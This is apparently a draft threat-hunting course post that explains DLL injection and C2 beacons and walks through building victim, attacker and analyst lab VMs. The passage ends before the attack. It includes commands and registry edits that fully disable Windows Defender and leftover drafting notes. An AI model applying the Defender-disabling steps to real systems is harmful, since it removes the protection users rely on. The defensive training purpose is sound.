---
title: "Threat Hunting standard Dll-injected C2 beacons (Practical Course)"
date: 2023-07-12T02:01:58+05:30
description: "In this course we'll learn how to threat hunt both classical and reflective DLL-injected C2 implants. We'll do so from 3 approaches: memory forensics, log analysis + UEBA, and traffic analysis."
tags: [threat_hunting, C2, dll_injection_attacks]
author: "faan ross"
---

*** 
[FOR THE VIDEO VERSION OF THIS COURSE CLICK HERE]()

# Hello friend, so glad you could make it!

{{< figure src="/img/poe.gif" title="" class="custom-figure" >}}

This is the first in what I intend to be an ongoing, always-evolving series on threat hunting. 





In this course we'll learn how to threat hunt both classical and reflective DLL-injected C2 implants. We'll do so from 3 approaches: memory forensics, log analysis + UEBA, and traffic analysis. The entire course is practically-oriented, meaning that we'll learn by doing. I'll sprinkle in a tiny bit of theory just so we are on the same page re: C2 frameworks and DLL-injection attacks; and in case you wanted to dig in deeper I provide extensive references throughout this document. 

In case you're new and a little trepidated...
I'm literally going to hold your hand from point A to Z so even if you are a beginner and most of this seems foreign **fret not**! WRITE SOMETHING and add a GIF




Here's a brief overview of what we'll be getting upto...
- In PART 1 we're going to set up the virtualized environment,
- we'll create a windows 10 VM which will server as our victim,
- we'll also set up a kali linux box which will be our attacker, 
- as well as an ubuntu box which we'll use to run some post-mortem analysis on.

.
- In PART 2 we'll run the actual attack ourselves,
- for the classical dll-injection we'll use metasploit to generate both the stager and meterpreter handler,
- once we've transferred the stager to the victim we'll run it from memory using powersploit,
- for the reflective dll-injection we'll perform the entire process using metasploit.

.
- In PART 3 we'll cover livememory forensics,
- first we'll do a basic live read using Process Hacker,

IN PART 4 we do post-mortem analysis


- we'll then dump the memory with winpmem,
- finally we'll have a look at the it with Volatility.

.
- IN PART 4 we'll get into some logs,
- along with standard Windows Event Logs, we'll also use other (cough, far superior, cough), logs we setup in the first part: namely sysmon and powershell logging,
- we'll briefly jump into the raw logs just to look at some very high-level indicators and then,
- we'll process them using the awesome UEBA framework DeepBlueCLIv3.

.
- IN PART 5 we'll look at traffic analysis,
- we'll run our PCAPS through Zeek,
- and get some insights from the threat hunting framework RITA.

IN final art put everything together and write a report./ 

In the end we'll recap and formulate some key takeaways to serve you on your journey as you venture forth into the world and become a bada$$ hunter.

But first, *le sigh*, it's required we just dip our toes into a wee bit of theory. But I promise once we're done here - 10 to 15 mins tops - it'll be applied learning until the end of our journey. 

Sounds good? Let's get it.

{{< figure src="/img/randy01.gif" title="" class="custom-figure" >}}

***

# Theory
# what is a DLL?
Succinctly as possible, a DLL is a communal library containing code. They are not a program or an executable in and of themselves, but they are in essence a collection of functions and data that can be used by other programs. 

So think of a DLL as a communal resource: let's say you have 4 programs running and they all want to use a common function - let's say for the sake of simplicity the ability to minimize the gui window. Now instead of each of those programs having their own personal copy of the function that allows that, they'll instead access a DLL that contains the function to minimize gui windows instead. So when you click on the minimize icon and that program needs the code to know how to behave, it does not get instructions from its own program code, rather it pulls it from the appropriate DLL with some help from the Windows API. 

Thus any program you run will constantly call on different DLLs to get access to a wide-variety of common (and often critical) functions and data.

# what is a classical DLL-injection?
So keeping what I just mentioned in mind - that any running program is accessing a variety of code from various DLLs at any time - what then is a DLL-injection attack? Well in a normal environment we have legit programs accessing code from legit DLLs. 

With a DLL-injection attack we enter into the population of legit DLLs a malicious one, that is a DLL that contains the code the attacker wants executed. The attacker then injects it into the memory space of a legitimate process. Using a Windows API function (commonly LoadLibrary or CreateRemoteThread), the attacker manipulates the legitimate process into loading and executing the malicious DLL. This effectively allows the malicious code within the DLL to run, often with the same permissions as the hijacked process.

Threat actors love DLL-injection attacks because since they are executed within the context of a legitimate process they run with the same privileges as that of the process (ie potentially elevated), but even more so it makes them much harder to detect. No longer can we look on the process-level for malware, instead we have to peer beneath them at a arguably convoluted level of abstraction. 

Even though classical DLL-injection attacks are less noisy for this exact reason, they still have a design flaw that makes our lives as threat hunters easier - they leave their fingerprints all over the disc. When the malicious DLL is initially transferred to the victim's system, it's written to disc, allowing us a potential breadcrumb for discovery. 

And thus the inevitable next iteration in this branch of digital evolution is...

# what is a reflective DLL-injection?
At a *high-level*  classical and reflective DLLs are identical save for one difference: whereas the former is written to disc then injected into memory space, the latter is injected into memory space directly. This makes them conventionally even harder to catch since we can't rely on any disc forensics to reveal its presence. However, as we'll learn in this course, in another way it makes it for those who know what to look for perhaps a bit easier. 

How come?

Well, on a pattern-level we can observe that the very fact that a DLL, meaning ANY DLL, is in memory without a disc counterpart is very unusual. Perhaps not immediate incident alert level unusual, but at the very least more than unusual enough to warrant further prodding with piqued interest. 

As a bridge to the closing part of our theory section let's zoom out a bit. Here we have been speaking about a specific mechanism of how malware (that is bad code) gets a victim's system to execute it. There are obviously many other such mechanisms, and equally bviously there are many different types of malware that use specifically DLL-injection attacks as the means to their desired ends (ie getting executed). 

In this specific course however we'll be focussing on a very specific type of malware, actually it would be even more accurate to say we'll focus on a specific component of a specific type of malware... 

# what is a Command and Control (C2) framework, stager, and beacon?

Let's start by sketching a scenario of how many typical attacks play out these days.

{{< figure src="/img/hackers01.gif" title="" class="custom-figure" >}}

An attacker sends a spear-phishing email to an employee at a company. The employee, perhaps tired and not paying full attention, opens the "uregent invoice" attached to the email. Opening this attachment executes a tiny program called a stager.

A stager, though not inherently malicious, "sets the stage" by performing a specific task: it reaches out to a designated address (owned by the hacker) to download another piece of code, then executes it.

The downloaded code establishes the attacker's presence on the victim's system. It acts as a "gateway," allowing the attacker to execute commands on the victim's system from their own.

So the system that the attacker uses to execute these commands is called the Command and Control (C2) server.

The code downloaded by the stager is a type of C2 implant known as a beacon, an approach popularized by Cobalt Strike. Unlike traditional C2 implants that maintain a continuous, persistent network connection (which can raise suspicion), a beacon does not. 

Instead, it periodically "calls home" to the C2 server, asking whether there are any new commands. If there are no commands, the connection is immediately terminated. If there are commands, the beacon retrieves them and then terminates the connection, lying dormant until the next scheduled "check-in". This sporadic communication helps the beacon blend into normal network traffic, making it more difficult to detect.

GREAT, and that's it for the theory, it's time to get going! But in case you are feeling inspired here are a selection of incredible resources that helped me.

{{< youtube borfuQGrB8g >}}

.
{{< youtube lz2ARbZ_5tE >}}

.
{{< youtube ihElrBBJQo8 >}}

*** 

# PART 1: Setting up our virtualized environment
# Overview

For this course I'll be using [VMWare Workstation](https://store-us.vmware.com/workstation_buy_dual) which as of writing costs around $200. However you could also do it with either [VMWare Player](https://www.vmware.com/ca/products/workstation-player.html), or [Oracle Virtualbox](https://www.virtualbox.org/wiki/Downloads), both of which are free. 

Note that some of the details of the setup might be slightly different if you choose to use either of the lastmentioned options and if that occurs then it'll be upto you to figure that out. Google, ChatGPT, StackExchange etc.

One final thing before we get setting up, you'll need the following three iso's (all free of course):
* for the victim we'll use [Windows 10 Enterprise Evaluation](https://info.microsoft.com/ww-landing-windows-10-enterprise.html)
* for the attacker we'll use [Kali Linux](https://www.kali.org/get-kali/#kali-installer-images)
* for post-mortem analysis we'll be using [Ubuntu Linux 20.04 Focal Fossa](https://releases.ubuntu.com/focal/). Just note here the actual edition 20.04 is important since we'll run RITA on it, which, as of writing, runs best on Focal Fossa.

Ok so at this point if you have your hosted hypervisor and all three iso's we are ready to proceed.

# VM 1: Windows 10 aka "The Victim" 

{{< figure src="/img/screamdrew.gif" title="" class="custom-figure" >}}
 
First we'll install the OS using the iso, following that we'll make a bunch of configurations including: 
- deep disable MS Defender + Windows updates
- install sysmon
- enable powershell logging
- install Process Hacker
- install winpmem
- install wireshark
- turn our VM into a template so we can clone copies in the future

# Installation

1. In VMWare Workstation goto `File` -> New Virtual Machine. 
2. Choose `Typical (recommended)`, then click `Next`. 
3. Then select `I will install the operating system later` and hit `Next`.

{{< figure src="/img/image001.png" title="" class="custom-figure" >}}

4. Select `Microsoft Windows`, and under Version select `Windows 10`. 
5. Here you are free to call the machine whatever you'd like, in my case I am calling it `Victim`. 
6. Select 60 GB and `Split virtual disk into multiple files`. 
7. Then on the final screen click on `Customize Hardware`.

{{< figure src="/img/image002.png" title="" class="custom-figure" >}}

8. Under `Memory` (see left hand column) I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB. 
9. Under `Processors` I suggest at least 2, if possible given your available resources then increase it to 4.
10. Under `New CD/DVD (SATA)` change Connection from Use Physical Drive to `Use ISO image file`. Click `Browse…` and select the location of your Windows 10 iso file.

{{< figure src="/img/image003.png" title="" class="custom-figure" >}}

11. Now finally select `Network Adapter`. Note we'll change this later to `Host-Only` (to minimize noise), but for now we'll need an internet connection to finish the installation so you can select either `NAT` or `Bridged`. Click `Close` then `Finish`.

You should now see your VM in your Library (left hand column), select it and then click on Power on this virtual machine.

{{< figure src="/img/image004.png" title="" class="custom-figure" >}}

Wait a short while and then you should see a Windows Setup window. Choose your desired language etc, select Next and then click on Install Now. Select ‘I accept the license terms’ and click Next. Next select ‘Custom: Install Windows only (advanced)’, and then select your virtual HD and click Next.

{{< figure src="/img/image005.png" title="" class="custom-figure" >}}

Once its done installing we’ll get to the setup, select your region, preferred keyboard layout etc. Accept the License Agreement (if you dare!). Now once you reach the Sign in page don’t fill anything in, rather select ‘Domain join instead’ in the bottom left corner.

{{< figure src="/img/image006.png" title="" class="custom-figure" >}}

Choose any username and password, in my case it'll be the highly original choice of `User` and `password`, feel free to choose something else. Then choose 3 securty questions, since this is a "burner" system used for the express purpose of this course don't overthink it. Turn off all the privacy settings (below), and for Cortana select `Not Now`.

{{< figure src="/img/image007.png" title="" class="custom-figure" >}}

Windows will now finalize installation + configuration, this could take a few minutes, whereafter you will see your Desktop.

# VMWare Tools
Next we'll install VMWare Tools which will ensure our VMs screen resolution assumes that of our actual monitor, but more importantly it also gives us the ability to copy and paste between the host and the VM. So this is optional, if you're oldskool and prefer writing all commands out by hand then feel free to skip this. 

So just to be sure, at this point you should be starting at a Windows desktop. Now in the VMWare windoes click `VM` and then `Install VMWare Tools`. If you open explorer (in the VM) you should now see a D drive. 

{{< figure src="/img/image008.png" title="" class="custom-figure" >}}

Double-click the drive, hit `Yes` when asked if we want this app to make changes to the device. Hit `Next`, select `Typical` and hit `Next`. Finally hit `Install` and then once done `Finish`. You'll need to restart your system for the changes to take effect, but we'll shut it down since we need to change a setting. So hit the Windows icon, Power icon, and then select `Shut Down`.

Right-click on your VM and select `Settings`. In the list on the LHS select `Display`, which should be right at the bottom. On the bottom - deselect `Automatically adjust user interface size in the virtual machine`, as well as `Strech mode`, it should now look like this:

{{< figure src="/img/image009.png" title="" class="custom-figure" >}}

Go ahead and start-up the VM once again, we'll now get to configuring our VM.

# Configuration
# Deep disable MS Defender + Windows updates

I call this 'deep disable' because simply toggling off the switches in `Settings` won't actually fully disable Defender and Updates. Windows looks at you like a little brother - it feels the need to protect you a bit, most of the time without you even knowing. (Unlike Linux of course which will allow you to basically nuke your entire OS if you so desired.) 

And just so you know why it is we're doing this:
- We are disabling Defender so that the AV won't interfere with us attacking the system. Now you might think well this represents an unrealistic situation since in real-life we'll always have our AV running. Thing is, this is a simulation - we are simulating an actual attack. Yes the AV might pick up on our mischevious escapades here since we are using very well-known and widely-used malware (Metasploit mainly). But, if you are being attacked by and actual threat actor worth their salt they likely won't be using something so familiar as default Metasploit modules - they will likely be capcable of using analogous technologies that your AV will not pick up on.
- As for updates, we disable this because sometimes we can spend all this time configuring and setting things up and then one day we boot our VM up, Windows does it's automatic update schpiel, and suddenly things are broken. This is thus simply to support the stability of our long-term use of this VM. 

1. **Disable Tamper Protection**
    1. Hit the `Start` icon, then select the `Settings` icon.
    2. Selet **`Update & Security `**.
    3. In LHS column, select `Windows Security`, then click `Open Windows Security`.
    4. A new window will pop up. Click on `Virus & threat protection`.
    5. Scroll down to the heading that says `Virus & threat protection settings` and click on `Manage settings`.
    6. There should be 4 toggles in total, we are really interested in disabling `Real-time protection`, however since we are here just go ahead and disable all of them. 
    7. Note that Windows will warn you and ask if you want to allow this app to make changes to the device, hit `Yes`.
    8. All 4 toggle settings should now be disabled.

{{< figure src="/img/image010.png" title="" class="custom-figure" >}}
    
2. **Disable the Windows Update service**
    1. Open the Run dialog box by pressing Win+R.
    2. Type **`services.msc`** and press Enter.
    3. In the Services list, find **`Windows Update`**, and double-click it.
    4. In the Windows Update Properties (Local Computer) window, under the **`General`** tab, in the **`Startup type:`** dropdown menu, select **`Disabled`** - see image below.
    5. Click **`Apply`** and then **`OK`**.
    
 {{< figure src="/img/image011.png" title="" class="custom-figure" >}}

3. **Disable Defender via Group Policy Editor**
    1. Open the Run dialog box by pressing Win+R.
    2. Type `gpedit.msc` and hit enter. The `Local Group Policy Editor` should have popped up.
    3. In the tree on the LHS navigate to the following: `Computer Configuration` > `Administrative Templates` > `Windows Components` > `Microsoft Defender Antivirus`.
    4. In the RHS double-click on `Turn off Microsoft Defender Antivirus`.
    5. In the new window on the top left select `Enabled` - see image below. 
    6. First hit `Apply` then `OK`.

 {{< figure src="/img/image012.png" title="" class="custom-figure" >}}

4. **Disable Updates via Group Policy Editor**
    1. Still in `Local Group Policy Editor`, navigate to: `Computer Configuration` > `Administrative Templates` > `Windows Components` > `Windows Update`.
    2. In the RHS double-click on `Configure Automatic Updates`.
    3. Select `Disabled`, then click `Apply` and `OK`.

{{< figure src="/img/image013.png" title="" class="custom-figure" >}}

5. **Disable Defender via Registry**
    1. In the search bar on the bottom type `cmd`.
    2. On the top left, right under `Best match` you should see `Command Prompt`.
    3. Right-click and select `Run as administrator`, hit `Yes`.
    4. Copy and paste the following command below into your command prompt and hit enter.
    ```
    REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
    ```
    
Almost there! We just need to boot into Safe Mode to make some final adjustments to the registry and then we are good to go.

6. **Reboot system in Safe Mode**
    1. Open the Run dialog box by pressing Win+R.
    2. Write `msconfig` and hit enter.
    3. Select the `Boot` tab.
    4. Under `Boot options` select `Safe boot`, ensure `Minimal` is selected - see image below. 
    5. Hit `Apply` first, the `OK`.
    6. Select `Restart`.
    
{{< figure src="/img/image014.png" title="" class="custom-figure" >}}

7. **Disable Defender via Registry**
    1. Open the Run dialog box by pressing Win+R.
    2. Write `regedit` and hit enter, this should bring up the `Registry Editor`.
    3. Below you will see a list of 6 keys. For each of these keys you will follow the same process: once the key is selected find the `Start` value in the RHS, double-click, change the value to `4` and hit `OK` - see image below.
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `Sense`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdBoot`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WinDefend`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdNisDrv`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdNisSvc`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdFilter`

{{< figure src="/img/image015.png" title="" class="custom-figure" >}}

8. **Disable Updates via Registry**
    1. Still in `Registry Editor` let's navigate to the following:
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SOFTWARE` > `Microsoft` > `Windows` > `CurrentVersion` > `WindowsUpdate` > `Auto Update`
    2. Right-click the `Auto Update` key, select `New`, and then click `DWORD (32-bit) Value`.
    3. Name the new key **`AUOptions`** and press Enter.
    4. Double-click the new **`AUOptions`** key and change its value to **`2`**. Click **`OK`** - see image below.
    5. Close Registry Editor.

{{< figure src="/img/image016.png" title="" class="custom-figure" >}}

9. **Leave Safe Mode**
    1. All that's left to do is get back into our regular Windows environment.
    2. Open the Run dialog box by pressing Win+R.
    3. Write `msconfig` and hit enter.
    4. Select `Boot` tab.
    5. Deselect `Safe boot`, hit `Apply`, hit `OK`.
    6. Hit `Restart`.

And that, I can promise you, is by far the most boring part of this entire course. But I did it on purpose - this is very important if you are going to start simulating attacks and threat hunting on your own system. And the cool thing is now that we've done it we'll also learn how to create templates + clones, meaning you would conceivably have to do it again, but simply clone the VM we've created. But before that, let's setup all the awesome tools we'll be using in this course. 

LFG!

IMAGE HERE

# SYSMON 
 
Ok so now you should be back in the normal Windows environment looking at your Desktop. We'll now setup Sysmon, for right now all you need to know is that Sysmon is a simple, free, Microsoft-owned program that will DRAMATICALLY improve our logging ability. 

Thing is the standard Windows Event Logs (hence forth referred to simply as WEL) were not designed by somebody with security in mind. In fact, ask most security professionals what they think of WEL and you'll probably get either a sarcastic chuckle or a couple of expletives.

But Sysmon, created by the legend Mark Russinovich, takes about 5 minutes to setup and will DRAMATICALLY improve logging, specifically as it relates to security events. In case you wanted to learn more about Sysmon's ins and outs [see this talk](https://www.youtube.com/watch?v=6W6pXp6EojY). And if you really wanted to get in deep, which at some point I recommend you do, see [this playlist](https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7) from TrustedSec. Finally here is another great talk by one of my favourite SANS instructors (Eric Conrad) on [using Sysmon for  Threat Hunting](https://www.youtube.com/watch?v=7dEfKn70HCI).

Before we get installing Sysmon there's just one thing you need to know - in addition to download the actual Sysmon install we also need a config file. Of late  I have heard a few trusted sources, included Eric Conrad (mentioned above) prefer [this version from Neo23x0](https://github.com/bakedmuffinman/Neo23x0-sysmon-config) whose authors included another blue team giant, Florian Roth. 

So first download the config file (which is in xml format), the [go here to download Sysmon](https://download.sysinternals.com/files/Sysmon.zip). You should now have two zip files - the config you download on Github, as well as the Sysmon zip file. Extract the Sysmon file, the contents should look as follows:

{{< figure src="/img/image017.png" title="" class="custom-figure" >}}

Now also extract the zip file containing the config. Inside of the folder rename `sysmonconfig-export.xml` to `sysmonconfig.xml`. Now simply cut (or copy) the file and paste it in the folder containing sysmon. 

Great everything is setup so now we can install it with a simple command. Open command prompt as administrator and navigate to the folder containing sysmon and the config file - in my case it is `c:\Users\User\Downloads\Sysmon`. Run the following command:

```
Sysmon.exe -accepteula -i
```

This is what a successful installation will look like:

{{< figure src="/img/image018.png" title="" class="custom-figure" >}}

Now let's just validate that it's running. First type `powershell` so we change over into a PS shell, and rrun the command `Get-Service sysmon`. In the image below we can see it is running - we are good to go!

{{< figure src="/img/image019.png" title="" class="custom-figure" >}}

That's it for Sysmon, not let's enable PowerShell logging. 

# PowerShell Logging

Unlike Sysmon we don't have to install anything here, Windows comes pre-configured with PS logging, but it's turned off by default. So we just need to flip this switch which again, as is the case with Sysmon, will dramatically improve logging as it relates to security.

Why?

Hackers often exploit PowerShell due to its powerful capabilities and direct access to the Windows API and other lower-level operations. This tactic, known as "living off the land," involves using the system's own tools against it. By enabling PowerShell logging, you record all command-line activities, which can be invaluable when conducting threat hunting. By analyzing the logs, you can identify the exact commands executed by an attacker, and therefore gain a clearer understanding of what they did and how they did it. 

Enable PowerShell logging:
1. Hit **`Win + R`** keys together to open the Run dialog box.
2. Type **`gpedit.msc`** and press Enter. This will open the **`Local Group Policy Editor`**.
3. In the left-hand panel, navigate to **`Computer Configuration`** > **`Administrative Templates`** > **`Windows Components`** > **`Windows PowerShell`**.
4. On the right-hand side, you will see a policy setting named **`Turn on PowerShell Script Block Logging`**, double-click.
5. In the properties window, select the **`Enabled`** - see image below.
6. Hit **`Apply`** and then **`OK`**.

{{< figure src="/img/image020.png" title="" class="custom-figure" >}}

# Install Software

And now finally we'll install three programs:
- We'll use **Process Hacker** for live memory forensics 
- We'll use **winpmem** to create a memory dump for post-mortem memory forensics 
- We'll use **Wireshark** to generate a pcap for egress analysis

.
You can download [Process Hacker here](https://processhacker.sourceforge.io/downloads.php). Once downloaded go ahead and install.

You can download the latest release of [winpmem here](https://github.com/Velocidex/WinPmem/releases). Since its a portable executable there is no installation required, just download the `.exe` file and place it on the desktop. 

And finally the Wireshark setup file can be [downloaded from here](https://2.na.dl.wireshark.org/win32/Wireshark-win32-3.6.15.exe). Once downloaded run Setup, just keep all options per default, nothing fancy required. 

That's it friend. We are done with BY FAR the heaviest lifting in terms of VM setup - the next two will be a breeze. But before we get to that there's one very simple thing we can do that will make our lives much easier in the future - turning this VM into a template for cloning.

# Creating a Template 

So why do we want to do this. Well by turning this VM we just created into a template we are in essence creating an archetype (blueprint). Then, whenever we want this same "victim" system for any project or course we can simply clone it. Thus instead of repeating this entire, rather cumbersome process we can click a few buttons and have it ready to go in under a minute. This is also useful if we ever "mess up" the VM, we can just come back to this starting point where the machine is fresh, but all our configurations and software are as required. 

1. First shut down the VM.
2. In VMWare you should see the library pane on the LHS listing our VM. If you don't, hit `F9`, or go to `View` > `Customize` > `Library`.
3. Right-click on our VM (`Victim`), select `Snapshot` > `Take Snapshot`.
4. Name it anything you'd like, I will be calling it `Genesis`. Hit `Take Snapshot`.
5. Again right-click the VM and select `Settings`. 
6. On the top left we can see two tabs - `Hardware` and `Options`, select `Options`.
7. Go down to the bottom and select `Advanced`.
8. Select `Enable Template mode (to be used for cloning)`, hit `OK`.

{{< figure src="/img/image021.png" title="" class="custom-figure" >}}

9. Note you might want to rename this VM to something like `Victim Template`, so we are aware this is the template that we should not be using, but rather use for cloning. You can do this under `Settings` > `Options` > `General`.

{{< figure src="/img/image022.png" title="" class="custom-figure" >}}

10. Now let's create our first clone which we will actually be using in the course. Right-click on `Victim Template`, select `Manage` > `Clone`. Hit `Next`.
11. We'll select the snapshot we created and hit `Next`. 
12. Keep selection as `Create a linked clone` and hit `Next`. 
13. Give your clone a name, I will be calling it `Victim01`. Choose a location and hit `Next`.

That's it! You should now see both `Victim Template` and `Victim01` in your library.

The bad news - we still have two VMs to install. The good news - they will require minimal-to-no configuration, so at this point we're about 80% done with our VM setup. So let's get it done.

# Kali Linux Installation

We'll be using Kali Linux for attack, that is it'll effectively serve as our C2 server. The great thing about Kali Linux is that everything we'll need is already installed, so we just have to install the actual operating system. 

1. In VMWare hit `File` > `New Virtual Machine...`
2. `Typical (recommended)` and hit `Next`. 
3. `I will install the operating system later` and hit `Next`.
4. Select `Linux`, and under Version select `Debian 11.x 64-bit`. (Note: Kali Linux is built on top of Debian Linux).

{{< figure src="/img/image023.png" title="" class="custom-figure" >}}

5. Again call the machine whatever you'd like, in my case I am calling it `Hacker`. 
6. Increase the Maximum disk size to 60 GB and select `Split virtual disk into multiple files`. 
7. Then on the final screen click on `Customize Hardware`.
8. Under `Memory` I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB. 
9. Under `Processors` I suggest at least 2, if possible given your available resources then increase it to 4.
10. Under `New CD/DVD (SATA)` change Connection from Use Physical Drive to `Use ISO image file`. Click `Browse…` and select the location of your Kali Linux iso image.
11. And again for `Network Adapter` we'll keep it as either `NAT` or `Bridged` for now. Click `Close` then `Finish`.

So now let's get to actually installing it:
1. Right-click on the VM and select `Power` > `Start Up Guest`.
2. Select `Graphical Install`.
3. Select language, country etc.
4. Choose any `Hostname`, leave `Domain name` blank, for Full name and username I chose `hacker`.
5. Create a password, again though OBVIOUSLY not a suggested real-world practice, in these simulations I tend to simply use `password` since it minimizes any administrative friction. 
6. Choose a timezone.
7. Next select `Guided - use entire disk` and hit `Continue`.
8. The only disk should be selected, hit `Continue`.
9. Keep `All files in one partition (recommended for new users)`, hit `Continue`.
10. Keep `Finish partinioning and write changes to disk`, hit `Continue`.
11. Select `Yes` and `Continue`.
12. In `Software selection` keep the default selection and hit `Continue`. Kali will now start installing, just be aware this can take a few minutes, probably around 5 to 10. 

{{< figure src="/img/image024.png" title="" class="custom-figure" >}}

13. Next it'll ask you about installing a GRUB boot loader, keep it selected as `Yes` and hit `Continue`. 
14. Select `/dev/sda` and hit `Continue`. More installing... 

{{< figure src="/img/image025.png" title="" class="custom-figure" >}}

15. Finally it will inform us it's complete, we can hit `Continue` causing the system to reboot into Kali Linux. Enter your username and password and hit `Log In`.
16. Let's shut down the VM, then right-click on it in the library and select `Settings`. Under `Display` deselect `Stretch mode` and hit `OK`.

{{< figure src="/img/image026.png" title="" class="custom-figure" >}}

And that's it for our attacker machine - feel free to repeat the Template-Cloning process we performed for our Windows 10 VM if you so desire.

# Ubuntu Linux 20.04 Installation

And now finally we'll set up our Ubuntu VM, afterwards we'll install RITA, Zeek, and Volatility. 

1. In VMWare hit `File` > `New Virtual Machine...`
2. `Typical (recommended)` and hit `Next`. 
3. `I will install the operating system later` and hit `Next`.
4. Select `Linux`, and under Version select `Ubuntu 64-bit`.
5. Again call the machine whatever you'd like, in my case I am calling it `Analyst`. 
6. Increase the Maximum disk size to 60 GB and select `Split virtual disk into multiple files`. 
7. Then on the final screen click on `Customize Hardware`.
8. Under `Memory` I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB. 
- NOTE: Keep in mind that you will never run more than 2 VMs at the same time (Victim + Hacker), this VM will always only run by itself after the simulated attack. 
9. Under `Processors` I suggest at least 2, if possible given your available resources then increase it to 4.
10. Under `New CD/DVD (SATA)` change Connection from Use Physical Drive to `Use ISO image file`. Click `Browse…` and select the location of your Ubuntu Linux 20.04 iso image. Make sure `Connect at power on` is enabled.
11. And again for `Network Adapter` we'll keep it as either `NAT` or `Bridged` for now. Click `Close` then `Finish`.

So now let's get to actually installing it:
1. Right-click on the VM and select `Power` > `Start Up Guest`.
2. Select `Try or Install Ubuntu`.
3. Once it boots up the GUI, select `Install Ubuntu`.

{{< figure src="/img/image027.png" title="" class="custom-figure" >}}

4. Select your keyboard and language, hit `Continue`.
5. Keep `Normal Installation` selected, unselect `Download updates while installing Ubuntu`.

{{< figure src="/img/image028.png" title="" class="custom-figure" >}}

6. Keep `Erase disk and install Ubuntu` selected, then hit `Install Now`. 
7. For the popup asking if you want to `Write the changes to disks?`, hit `Continue`.
8. Choose a timezone and hit `Continue`.
9. Now fill in your name and desired credentials, I'll be using `analyst` and `password`.
10. When it's complete you can power the system off. Go into settings, under `CD/DVD (SATA)` disable `Connect at power on`.
11. Then goto `Display`, disable `Stretch mode`.
12. Hit `OK`, start the VM up once again, log in.
13. A few moments after logging in and answer Ubuntu's questions you'll be asked whether you want to upgrade. IMPORTANT: Do not do so, decline the offer. 

{{< figure src="/img/image029.png" title="" class="custom-figure" >}}

OK, that's it and now we'll just install RITA, Zeek, Volatility, DeepBlueCLIv3 and then the fun can finally begin!

# RITA + Zeek

Here's the cool thing about RITA: it will automatically install Zeek (and MariaDB btw) when you install it. Even better, it actually makes alterations to the standard Zeek config which will serve us even better - I'll discuss the exact details of this and why it's important when we get to that section in our course. For now let's get to installing.

1. Goto the [RITA Github repo](https://github.com/activecm/rita).
2. Scroll down to `Install` and follow the instructions using the `install.sh` script. During installation you will be asked a few questions, answer `y` and hit enter each time. 
3. Let's check the version of RITA to ensure installation was successful. First close your terminal and reopen and then run the commands seen in image below, you should get similiar results. 

{{< figure src="/img/image030.png" title="" class="custom-figure" >}}

# Volatility

CHANGE THIS SIMPLY RUN THIS
git clone https://github.com/volatilityfoundation/volatility3.git


sudo apt install python3-pip


pip3 install -r requirements.txt



1. Once again we'll visit the [program's Github repo.](https://github.com/volatilityfoundation/volatility3)
2. There is no real installation here, we'll simply git clone the repo, and then we'll run Volatility from that local directory whenever we use it. 
```
sudo git clone https://github.com/volatilityfoundation/volatility3.git
```

now install python2 
Yes, you can install Python 2 and Python 3 side by side on Ubuntu without them interfering with each other. They are designed to coexist. You can use Python 3 with the python3 command and Python 2 with the python command.

If Python 2 is not already installed on your Ubuntu system, you can install it using the following command:

bash
Copy code
sudo apt update
sudo apt install python2

# DeepBlueCLI

To run DeepBlueCLI we'll need PowerShell. And the good news of course is that PowerShell core is now cross-platform, so we can go ahead and install it on our analyst machine.

1. Open your terminal.
2. First update your list of packages
```
sudo apt update
```
3. Next, install the prerequisite packages. Microsoft provides a package for easy installation.
```
sudo apt install -y wget apt-transport-https software-properties-common
```
4. Now you will need to download and add Microsoft's GPG key which is used to sign their packages.
```
wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
```
5. We can now install PowerShell.
```
sudo apt update
sudo apt install -y powershell
```
6. You can now switch from **bash** to  **PowerShell** at anytime in your terminal by running `pwsh`, if you want to switch back run `bash`.

{{< figure src="/img/image065.png" title="" class="custom-figure" >}}

Great now all that's left to do is install DeepBlueCLI.

1. Staying in the terminal, in `bash`, let's navigate to the `/Desktop`.
2. Run the following command
```
git clone https://github.com/sans-blue-team/DeepBlueCLI.git
```

That's literally it.

{{< figure src="/img/easy.gif" title="" class="custom-figure" >}}






3. Shut down your Ubuntu VM, we won't be using it for some time. 

Aaaaaaaalright! We are good to get rolling with our Attack. YEAH. There is however one more optional step, this is not required but will decrease network noise meaning when we do our log analysis we'll have a tidier dataset. I recommend doing it, it'll take about 30 seconds.

For the Windows VMs only:
1. Right-click on the VM in the library and select `Settings`.
2. Go to `Network Adapter`, change to `Host-only`, hit `OK`.

{{< figure src="/img/image031.png" title="" class="custom-figure" >}}

That's it. And just so you are aware - we took this VMs ability to connect to the internet away, but it can still connect to our hacker VM on the local network. 

OK. Do you know what time it is? Yeah it's time for all this installing and configuring to pay off - and we kick things off by emulating the attacker! Let's get it!

{{< figure src="/img/strangelove.gif" title="" class="custom-figure" >}}

***

# PART 2: ATTACK TIME 

Preamble:
1. First things first - fire up both VMs.
2. On our kali VM - open a terminal and run `ip a` so we can see what the ip address is. Write this down, we'll be using it a few times during the generation of our stager and handler. You can see mine below is **192.168.230.155 **NOTE: Yours will be different!

{{< figure src="/img/image032.png" title="" class="custom-figure" >}}

3. Now go to the Windows VM. Open an administrative PowerShell terminal. Run `ipconfig` so we also have the ip of the victim - write this down. 

{{< figure src="/img/image033.png" title="" class="custom-figure" >}}

4. And now, though it's not really required, I just like to ping the Kali VM from this same terminal just to make sure the two VMs are connecting to one another on the local network. Obviously if this fails you will have to go back and troubleshoot.
